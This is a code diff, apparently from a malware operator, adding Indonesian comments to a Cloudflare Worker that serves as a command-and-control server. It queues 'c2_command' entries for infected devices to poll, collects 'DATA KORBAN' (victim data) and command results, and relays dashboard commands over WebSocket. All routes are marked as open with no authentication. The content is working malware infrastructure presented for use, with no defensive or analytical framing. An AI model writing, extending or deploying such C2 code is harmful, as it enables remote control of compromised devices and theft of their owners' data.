@@ -2,8 +2,14 @@
 // Cloudflare Worker - verifikasi-api (TANPA PASSWORD!)
 // ================================================================
 
+// ============================================================
+// KONFIGURASI
+// ============================================================
 const MAX_DATA = 5000;
 
+// ============================================================
+// CORS HEADERS
+// ============================================================
 const CORS = {
   'Access-Control-Allow-Origin': '*',
   'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
@@ -12,6 +18,9 @@ const CORS = {
   'Access-Control-Max-Age': '86400',
 };
 
+// ============================================================
+// RESPONSE HELPERS
+// ============================================================
 function jsonResponse(data, status = 200, extraHeaders = {}) {
   return new Response(JSON.stringify(data), {
     status,
@@ -23,6 +32,9 @@ function jsonResponse(data, status = 200, extraHeaders = {}) {
   });
 }
 
+// ============================================================
+// MAIN HANDLER - TANPA AUTH!
+// ============================================================
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
@@ -32,18 +44,22 @@ export default {
       return new Response(null, { headers: CORS });
     }
 
+    // 🔥 POST /data atau /api/data - BEBAS!
     if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
       return await handlePostData(request, env);
     }
 
+    // 🔥 POST /batch - BEBAS!
     if (url.pathname === '/batch' && method === 'POST') {
       return await handleBatchCommand(request, env);
     }
 
+    // 🔥 GET /data atau /api/data - BEBAS!
     if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
       return await handleGetData(request, env);
     }
 
+    // 🔥 GET /get-password - BEBAS! (LANGSUNG RETURN TANPA PASSWORD)
     if (url.pathname === '/get-password' && method === 'GET') {
       return jsonResponse({ 
         status: 'ok',
@@ -52,10 +68,12 @@ export default {
       });
     }
 
+    // 🔥 WEBSOCKET - BEBAS!
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
     }
 
+    // ROOT - Health Check
     if (url.pathname === '/' && method === 'GET') {
       const raw = await env.DATA.get('data') || '[]';
       const data = JSON.parse(raw);
@@ -71,6 +89,9 @@ export default {
   }
 };
 
+// ============================================================
+// HANDLER: POST /data (BEBAS!)
+// ============================================================
 async function handlePostData(request, env) {
   try {
     const body = await request.json();
@@ -79,6 +100,7 @@ async function handlePostData(request, env) {
       return jsonResponse({ error: 'Invalid request body' }, 400);
     }
     
+    // 🔥 C2 COMMAND - SIMPAN KE QUEUE!
     if (body.sumber === 'c2_command' || body.type === 'c2_command') {
       const cmdData = body.data || body;
       cmdData.timestamp = Date.now();
@@ -89,6 +111,7 @@ async function handlePostData(request, env) {
       var queue = JSON.parse(queueRaw);
       queue.push(cmdData);
       await env.DATA.put('perintah_queue', JSON.stringify(queue));
+      
       await env.DATA.put('perintah', JSON.stringify(cmdData));
       
       return jsonResponse({ 
@@ -99,6 +122,7 @@ async function handlePostData(request, env) {
       });
     }
     
+    // 🔥 DATA KORBAN
     const d = {
       waktu: new Date().toISOString(),
       sumber: body.sumber || body.type || 'unknown',
@@ -127,6 +151,9 @@ async function handlePostData(request, env) {
   }
 }
 
+// ============================================================
+// HANDLER: POST /batch (BEBAS!)
+// ============================================================
 async function handleBatchCommand(request, env) {
   try {
     const body = await request.json();
@@ -180,9 +207,13 @@ async function handleBatchCommand(request, env) {
   }
 }
 
+// ============================================================
+// HANDLER: GET /data (BEBAS!)
+// ============================================================
 async function handleGetData(request, env) {
   const url = new URL(request.url);
   
+  // 🔥 DEVICE AMBIL C2 (BEBAS!)
   if (url.searchParams.get('type') === 'perintah') {
     try {
       var queueRaw = await env.DATA.get('perintah_queue') || '[]';
@@ -227,6 +258,7 @@ async function handleGetData(request, env) {
     }
   }
   
+  // 🔥 DASHBOARD LIHAT DATA (BEBAS!)
   try {
     const raw = await env.DATA.get('data') || '[]';
     let data = JSON.parse(raw);
@@ -266,6 +298,9 @@ async function handleGetData(request, env) {
   }
 }
 
+// ============================================================
+// HANDLER: WebSocket (BEBAS!)
+// ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
   if (!upgradeHeader || upgradeHeader !== 'websocket') {
@@ -289,6 +324,7 @@ async function handleWebSocket(request, env) {
         return;
       }
 
+      // COMMAND DARI DASHBOARD (BEBAS!)
       if (data.type === 'command') {
         var cmdData = data.command;
         cmdData.timestamp = Date.now();
@@ -305,6 +341,7 @@ async function handleWebSocket(request, env) {
         return;
       }
 
+      // DATA DARI DEVICE
       if (data.type === 'data') {
         const raw = await env.DATA.get('data') || '[]';
         let allData = JSON.parse(raw);
@@ -322,6 +359,7 @@ async function handleWebSocket(request, env) {
         return;
       }
 
+      // C2 RESULT
       if (data.type === 'c2_result') {
         const raw = await env.DATA.get('data') || '[]';
         let allData = JSON.parse(raw);
@@ -339,6 +377,7 @@ async function handleWebSocket(request, env) {
         return;
       }
 
+      // PING/PONG
       if (data.type === 'ping') {
         server.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
         return;
